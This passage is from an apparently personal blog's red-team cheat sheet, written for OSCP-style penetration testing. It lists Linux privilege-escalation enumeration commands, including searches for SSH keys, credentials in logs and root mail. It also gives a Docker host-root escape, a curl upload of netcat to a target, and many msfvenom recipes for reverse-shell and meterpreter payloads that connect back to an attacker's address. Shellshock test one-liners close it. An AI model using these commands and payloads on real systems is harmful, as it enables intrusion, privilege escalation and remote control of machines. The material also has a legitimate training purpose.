 &lt;code&gt;sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Anything interesting we can run as sudo?&lt;br /&gt;
 &lt;code&gt;sudo -l 2&amp;gt;/dev/null | grep -w &#39;nmap|perl|awk|find|bash|sh|man|more|less|vi|vim|nc|netcat|python|ruby|lua|irb&#39; | xargs -r ls -la 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;History -&lt;br /&gt;
 &lt;code&gt;history&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Env vars&lt;br /&gt;
 &lt;code&gt;env&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Available shells&lt;br /&gt;
 &lt;code&gt;cat /etc/shells	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SUID files&lt;br /&gt;
 &lt;code&gt;find / -perm -4000 -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;SUID owned by root&lt;br /&gt;
 &lt;code&gt;find / -uid 0 -perm -4000 -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;GUID files&lt;br /&gt;
 &lt;code&gt;find / -perm -2000 -type f 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;World writable&lt;br /&gt;
 &lt;code&gt;find / -perm -2 -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;World writable executed&lt;br /&gt;
 &lt;code&gt;find / ! -path &amp;quot;*/proc/*&amp;quot; -perm -2 -type f -print 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;World writable dirs&lt;br /&gt;
 &lt;code&gt;find / -perm -2 -type d 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;rhost files&lt;br /&gt;
 &lt;code&gt;find /home –name *.rhosts -print 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Plan files&lt;br /&gt;
 &lt;code&gt;find /home -iname *.plan -exec ls -la &amp;#123;&amp;#125; ; -exec cat &amp;#123;&amp;#125; 2&amp;gt;/dev/null ;	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;hosts.equiv&lt;br /&gt;
 &lt;code&gt;find /etc -iname hosts.equiv -exec ls -la &amp;#123;&amp;#125; 2&amp;gt;/dev/null ; -exec cat &amp;#123;&amp;#125; 2&amp;gt;/dev/null ;	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Can we peek at /root?&lt;br /&gt;
 &lt;code&gt;ls -ahlR /root/	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Find ssh files&lt;br /&gt;
 &lt;code&gt;find / -name &amp;quot;id_dsa*&amp;quot; -o -name &amp;quot;id_rsa*&amp;quot; -o -name &amp;quot;known_hosts&amp;quot; -o -name &amp;quot;authorized_hosts&amp;quot; -o -name &amp;quot;authorized_keys&amp;quot; 2&amp;gt;/dev/null |xargs -r ls -la&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Inetd&lt;br /&gt;
 &lt;code&gt;ls -la /usr/sbin/in.*	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Grep logs for loot&lt;br /&gt;
 &lt;code&gt;grep -l -i pass /var/log/*.log 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;What do we have in logs&lt;br /&gt;
 &lt;code&gt;find /var/log -type f -exec ls -la &amp;#123;&amp;#125; ; 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Find conf files in /etc&lt;br /&gt;
 &lt;code&gt;find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la &amp;#123;&amp;#125; ; 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;as above&lt;br /&gt;
 &lt;code&gt;ls -la /etc/*.conf	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;List open files&lt;br /&gt;
 &lt;code&gt;lsof -i -n	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Can we read root mail?&lt;br /&gt;
 &lt;code&gt;head /var/mail/root	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;What is running as root?&lt;br /&gt;
 &lt;code&gt;ps aux | grep root	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Lookup paths to running files&lt;br /&gt;
 &lt;code&gt;ps aux | awk &#39;&amp;#123;print $11&amp;#125;&#39;|xargs -r ls -la 2&amp;gt;/dev/null |awk &#39;!x[$0]++&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Exports and permissions of NFS&lt;br /&gt;
 &lt;code&gt;ls -la /etc/exports 2&amp;gt;/dev/null; cat /etc/exports 2&amp;gt;/dev/null	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;List sched jobs&lt;br /&gt;
 &lt;code&gt;ls -la /etc/cron*	&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;List open connections (run with sudo/as root for more results)&lt;br /&gt;
 &lt;code&gt;lsof -i&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Installed pkgs:&lt;br /&gt;
 &lt;code&gt;dpkg -l&lt;/code&gt;  (debian),  &lt;code&gt;rpm -qa&lt;/code&gt;  (RH)&lt;/p&gt;
&lt;p&gt;sudo version?&lt;br /&gt;
 &lt;code&gt;sudo -V&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Available compilers&lt;br /&gt;
 &lt;code&gt;dpkg --list 2&amp;gt;/dev/null| grep compiler |grep -v decompiler 2&amp;gt;/dev/null &amp;amp;&amp;amp; yum list installed &#39;gcc*&#39; 2&amp;gt;/dev/null| grep gcc 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;docker-tips&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#docker-tips&#34;&gt;#&lt;/a&gt; Docker tips&lt;/h3&gt;
&lt;p&gt;Since most likely Docker runs as root if you can execute docker commands as unpriviledged user you can very likely use Docker&#39;s privs instead.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash&lt;/code&gt;  - note that the root folder from host is mounted as  &lt;code&gt;/host&lt;/code&gt; . You&#39;ll also see all processes running on host and be connected to same NICs.&lt;/p&gt;
&lt;p&gt;You may want to look into escaping UTS and IPC namespacing with  &lt;code&gt;--uts=host --ipc=host&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;upload-files-using-curl-with-webdav&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#upload-files-using-curl-with-webdav&#34;&gt;#&lt;/a&gt; Upload files using cUrl with WebDAV&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;curl -T nc.exe http://targetIP/nc.txt
curl -X MOVE -v -H &amp;quot;Destination:http://targetIP/nc.exe&amp;quot; http://targetIP/nc.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;msfvenom&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msfvenom&#34;&gt;#&lt;/a&gt; msfvenom&lt;/h2&gt;
&lt;h3 id=&#34;list-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#list-payloads&#34;&gt;#&lt;/a&gt; List payloads&lt;/h3&gt;
&lt;p&gt;msfvenom -l&lt;/p&gt;
&lt;h3 id=&#34;binaries&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#binaries&#34;&gt;#&lt;/a&gt; Binaries&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Linux&lt;br /&gt;
 &lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f elf &amp;gt; shell.elf&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows&lt;br /&gt;
 &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f exe &amp;gt; shell.exe&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mac&lt;br /&gt;
 &lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f macho &amp;gt; shell.macho&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;web-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web-payloads&#34;&gt;#&lt;/a&gt; Web Payloads&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;PHP&lt;br /&gt;
 &lt;code&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.php&lt;/code&gt; &lt;br /&gt;
 &lt;code&gt;cat shell.php | pbcopy &amp;amp;&amp;amp; echo &#39;&amp;lt;?php &#39; | tr -d &#39;\n&#39; &amp;gt; shell.php &amp;amp;&amp;amp; pbpaste &amp;gt;&amp;gt; shell.php&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ASP&lt;br /&gt;
 &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f asp &amp;gt; shell.asp&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;JSP&lt;br /&gt;
 &lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.jsp&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;WAR&lt;br /&gt;
 &lt;code&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f war &amp;gt; shell.war&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;scripting-payloads&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#scripting-payloads&#34;&gt;#&lt;/a&gt; Scripting Payloads&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Python&lt;br /&gt;
 &lt;code&gt;msfvenom -p cmd/unix/reverse_python LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.py&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Bash&lt;br /&gt;
 &lt;code&gt;msfvenom -p cmd/unix/reverse_bash LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.sh&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Perl&lt;br /&gt;
 &lt;code&gt;msfvenom -p cmd/unix/reverse_perl LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f raw &amp;gt; shell.pl&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;shellcode&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellcode&#34;&gt;#&lt;/a&gt; Shellcode&lt;/h3&gt;
&lt;p&gt;For all shellcode see  &lt;code&gt;msfvenom –help-formats&lt;/code&gt;  for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Linux Based Shellcode&lt;br /&gt;
 &lt;code&gt;msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Windows Based Shellcode&lt;br /&gt;
 &lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Mac Based Shellcode&lt;br /&gt;
 &lt;code&gt;msfvenom -p osx/x86/shell_reverse_tcp LHOST=&amp;lt;Your IP Address&amp;gt; LPORT=&amp;lt;Your Port to Connect On&amp;gt; -f &amp;lt;language&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;shellshock&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shellshock&#34;&gt;#&lt;/a&gt; Shellshock&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-6271&lt;br /&gt;
 &lt;code&gt;env X=&#39;() &amp;#123; :; &amp;#125;; echo &amp;quot;CVE-2014-6271 vulnerable&amp;quot;&#39; bash -c id&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-7169&lt;br /&gt;
 &lt;code&gt;env X=&#39;() &amp;#123; (a)=&amp;gt;\&#39; bash -c &amp;quot;echo date&amp;quot;; cat echo&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-7186&lt;br /&gt;
 &lt;code&gt;bash -c &#39;true &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF &amp;lt;&amp;lt;EOF&#39; || echo &amp;quot;CVE-2014-7186 vulnerable, redir_stack&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-7187&lt;br /&gt;
 &lt;code&gt;(for x in &amp;#123;1..200&amp;#125; ; do echo &amp;quot;for x$x in ; do :&amp;quot;; done; for x in &amp;#123;1..200&amp;#125; ; do echo done ; done) | bash || echo &amp;quot;CVE-2014-7187 vulnerable, word_lineno&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CVE-2014-6278&lt;br /&gt;
 &lt;code&gt;env X=&#39;() &amp;#123; _; &amp;#125; &amp;gt;_[$($())] &amp;#123; echo CVE-2014-6278 vulnerable; id; &amp;#125;&#39; bash -c :&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;references&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#references&#34;&gt;#&lt;/a&gt; References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zdXBwb3J0Lm9mZmVuc2l2ZS1zZWN1cml0eS5jb20vIyFvc2NwLWV4YW0tZ3VpZGUubWQ=&#34;&gt;OSCP Exam Guide&lt;/span&gt; - MUST read!&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2JpdHZpamF5cy5naXRodWIuaW8v&#34;&gt;The Magic of Learning&lt;/span&gt; - a real treasure trove!&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbQ==&#34;&gt;FuzzySecurity&lt;/span&gt; - this is something you must bookmark... period. I found the &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5mdXp6eXNlY3VyaXR5LmNvbS90dXRvcmlhbHMvMTYuaHRtbA==&#34;&gt;Windows Privilege Escalation Fundamentals&lt;/span&gt; especially useful.&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY29tcHV0ZXJob3BlLmNvbS93bWljLmh0bQ==&#34;&gt;WMIC reference/guide&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzLw==&#34;&gt;SysInternals&lt;/span&gt; - this is a must have for working on Windows boxes.&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdA==&#34;&gt;PowerSploit&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5ncmV5aGF0aGFja2VyLm5ldC8/cD03Mzg=&#34;&gt;Elevating privileges by exploiting weak folder permissions&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jYXJuYWwwd25hZ2UuY29tL3BhcGVycy9MQVJFUy1Db2xkRnVzaW9uLnBkZg==&#34;&gt;ColdFusion for PenTesters&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5nbnVjaXRpemVuLm9yZy9ibG9nL2NvbGRmdXNpb24tZGlyZWN0b3J5LXRyYXZlcnNhbC1mYXEtY3ZlLTIwMTAtMjg2MS8=&#34;&gt;ColdFusion Path Traversal&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvcGVuZXRyYXRpb24tdGVzdGluZy10b29scy1jaGVhdC1zaGVldC8=&#34;&gt;Penetration Testing Tools Cheat Sheet&lt;/span&gt; - Good read. Check out other cheat sheets on this page too!&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2t1cm9iZWF0cy9maW1hcA==&#34;&gt;fimap&lt;/span&gt; - LFI/RFI scanner&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3p0Z3JhY2UvY2hhbmdlbWU=&#34;&gt;Changeme&lt;/span&gt; - default password scanner&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jaXJ0Lm5ldC9wYXNzd29yZHM=&#34;&gt;CIRT Default Passwords DB&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3Jlc291cmNlcy5pbmZvc2VjaW5zdGl0dXRlLmNvbS9sb2NhbC1maWxlLWluY2x1c2lvbi1jb2RlLWV4ZWN1dGlvbg==&#34;&gt;From LFI to Shell&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oaWdob24uY29mZmVlL2Jsb2cvbGludXgtY29tbWFuZHMtY2hlYXQtc2hlZXQv&#34;&gt;Useful Linux commands&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cucmVib290dXNlci5jb20vP3A9MTYyMw==&#34;&gt;Local Linux Enumeration&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9uZXRzZWMud3MvP3A9MzMx&#34;&gt;Creating Metasploid Payloads&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL211Yml4L3NoZWxsc2hvY2tlci1wb2Nz&#34;&gt;Shellshock PoCs&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
        <category term="网络安全" scheme="https://self-ferry.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" />
        <category term="RedTeam" scheme="https://self-ferry.github.io/tags/RedTeam/" />
        <updated>2021-01-18T07:58:06.000Z</updated>
    </entry>
</feed>
